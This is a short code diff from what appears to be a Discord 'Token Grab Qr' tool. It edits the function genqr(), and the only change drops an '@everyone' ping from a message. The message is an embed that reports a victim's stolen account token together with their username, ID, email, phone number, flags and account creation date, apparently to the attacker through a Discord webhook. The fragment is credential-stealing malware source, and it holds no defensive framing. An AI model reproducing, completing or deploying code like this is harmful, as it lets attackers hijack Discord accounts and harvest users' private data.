@@ -73,7 +73,7 @@ def genqr():
                 locale = res['locale']
                 avatar_id = res['avatar']
                 creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
-                em = DiscordEmbed(color='03b2f8' ,Title="Token Grab Qr",description=f"""\nToken Grab Qr\n@everyone\nToken : {token}\nName: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})""")
+                em = DiscordEmbed(color='03b2f8' ,Title="Token Grab Qr",description=f"""\nToken Grab Qr\nToken : {token}\nName: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})""")
                 fields = [
                     {'name': 'Phone : ', 'value': res['phone']},
                     {'name': 'Flags : ', 'value': res['flags']},
